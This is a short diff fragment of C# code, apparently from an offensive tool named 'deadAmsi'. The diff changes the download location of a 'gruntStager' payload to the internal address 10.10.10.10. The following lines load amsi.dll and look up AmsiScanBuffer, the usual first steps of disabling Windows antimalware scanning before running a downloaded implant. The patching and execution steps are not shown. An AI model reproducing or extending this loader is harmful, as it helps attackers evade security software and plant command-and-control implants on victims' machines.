@@ -10,7 +10,7 @@ namespace deadAmsi
         private static void Main(string[] args)
         {
             var client = new WebClient();
-            var gruntStager = client.DownloadData("https://github.com/deadone/scripting-dev/raw/master/other/deadpayload.exe");
+            var gruntStager = client.DownloadData("http://10.10.10.10/deadpayload.exe");
 
             var amsiDll = Win32.LoadLibrary("amsi.dll");
             var asbAddress = Win32.GetProcAddress(amsiDll, "AmsiScanBuffer");
